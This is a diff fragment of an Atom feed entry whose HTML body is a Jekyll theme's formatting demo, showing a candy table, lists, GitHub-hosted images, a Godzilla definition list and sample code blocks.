+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;ok&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;good swedish fish&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;nice&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;out of stock&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;good and plenty&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;nice&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;ok&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;good &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;oreos&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;hmm&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;ok&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;good &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zoute&lt;/code&gt; drop&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;yumm&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;theres-a-horizontal-rule-below-this&quot;&gt;There’s a horizontal rule below this.&lt;/h3&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;here-is-an-unordered-list&quot;&gt;Here is an unordered list:&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Item foo&lt;/li&gt;
+  &lt;li&gt;Item bar&lt;/li&gt;
+  &lt;li&gt;Item baz&lt;/li&gt;
+  &lt;li&gt;Item zip&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;and-an-ordered-list&quot;&gt;And an ordered list:&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Item one&lt;/li&gt;
+  &lt;li&gt;Item two&lt;/li&gt;
+  &lt;li&gt;Item three&lt;/li&gt;
+  &lt;li&gt;Item four&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;and-a-nested-list&quot;&gt;And a nested list:&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;level 1 item
+    &lt;ul&gt;
+      &lt;li&gt;level 2 item&lt;/li&gt;
+      &lt;li&gt;level 2 item
+        &lt;ul&gt;
+          &lt;li&gt;level 3 item&lt;/li&gt;
+          &lt;li&gt;level 3 item&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;level 1 item
+    &lt;ul&gt;
+      &lt;li&gt;level 2 item&lt;/li&gt;
+      &lt;li&gt;level 2 item&lt;/li&gt;
+      &lt;li&gt;level 2 item&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;level 1 item
+    &lt;ul&gt;
+      &lt;li&gt;level 2 item&lt;/li&gt;
+      &lt;li&gt;level 2 item&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;level 1 item&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;small-image&quot;&gt;Small image&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://assets-cdn.github.com/images/icons/emoji/octocat.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;large-image&quot;&gt;Large image&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://guides.github.com/activities/hello-world/branching.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;definition-lists-can-be-used-with-html-syntax&quot;&gt;Definition lists can be used with HTML syntax.&lt;/h3&gt;
+
+&lt;dl&gt;
+&lt;dt&gt;Name&lt;/dt&gt;
+&lt;dd&gt;Godzilla&lt;/dd&gt;
+&lt;dt&gt;Born&lt;/dt&gt;
+&lt;dd&gt;1952&lt;/dd&gt;
+&lt;dt&gt;Birthplace&lt;/dt&gt;
+&lt;dd&gt;Japan&lt;/dd&gt;
+&lt;dt&gt;Color&lt;/dt&gt;
+&lt;dd&gt;Green&lt;/dd&gt;
+&lt;/dl&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The final element.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><summary type="html">Text can be bold, italic, strikethrough or keyword.</summary></entry></feed>
